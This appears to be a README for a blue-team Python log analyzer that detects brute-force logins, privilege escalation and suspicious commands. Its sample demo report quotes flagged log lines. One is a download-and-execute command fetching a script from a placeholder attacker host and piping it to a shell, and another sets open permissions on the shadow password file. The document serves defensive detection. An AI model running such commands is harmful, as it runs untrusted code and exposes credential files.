# Log Analyzer - Blue Team Tool

[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

A simple log parser and analyzer designed to detect suspicious security patterns in system logs. Built for Blue Team practitioners.

## Features

- **Failed login detection** - Identifies failed authentication attempts from multiple log formats
- **Brute force detection** - Flags IPs with excessive failed login attempts
- **Privilege escalation monitoring** - Detects sudo, su, and Windows privilege events
- **Suspicious pattern matching** - Identifies dangerous commands and attack patterns
- **Summary reports** - Generates readable security reports

## Supported Log Formats

| Format | Example |
|--------|---------|
| Linux SSH logs | `/var/log/auth.log` |
| Linux PAM logs | `pam_unix` entries |
| Windows Event Logs | EventID 4624/4625 (text export) |
| Generic logs | Any text log with recognizable patterns |

## Installation

No external dependencies required. Uses Python standard library only.

```bash
# Clone the repository
git clone https://github.com/brushi/log-analyzer.git
cd log-analyzer
```

## Usage

### Analyze a log file

```bash
python log_analyzer.py /var/log/auth.log
```

### Save report to file

```bash
python log_analyzer.py /var/log/auth.log --output report.txt
```

### Run demo mode

```bash
python log_analyzer.py --demo
```

### Custom brute force threshold

```bash
python log_analyzer.py auth.log --threshold 3
```

## Demo Output

```
============================================================
  LOG ANALYSIS SECURITY REPORT
  Generated: 2026-05-22 22:48:00
============================================================

[SUMMARY]
  Total lines analyzed:    27
  Failed login attempts:   20
  Successful logins:       2
  Privilege escalations:   2
  Suspicious events:       2

[!] BRUTE FORCE DETECTED
  IPs with 5+ failed attempts:
    - 192.168.1.100: 10 attempts
    - 203.0.113.42: 7 attempts

[TOP FAILED LOGIN SOURCES]
         192.168.1.100: 10 attempts
          203.0.113.42: 7 attempts
             10.0.0.50: 3 attempts

[TOP SUCCESSFUL LOGIN SOURCES]
             172.16.0.5: 1 logins
              10.0.0.1: 1 logins

[PRIVILEGE ESCALATION EVENTS]
  > Jan 15 08:30:00 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
  > Jan 15 09:00:00 server sudo: deploy : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx

[SUSPICIOUS EVENTS]
  [Overly permissive file permissions]
    Jan 15 08:35:00 server kernel: chmod 777 /etc/shadow attempted by user admin
  [Download and execute pattern]
    Jan 15 08:40:00 server bash[5678]: wget http://evil.com/malware.sh | sh

============================================================
  END OF REPORT
============================================================
```

## Project Structure

```
log-analyzer/
├── log_analyzer.py    # Main script
├── README.md          # Documentation
├── requirements.txt   # Dependencies (none)
└── LICENSE            # MIT License
```

## License

MIT License - see [LICENSE](LICENSE) for details.
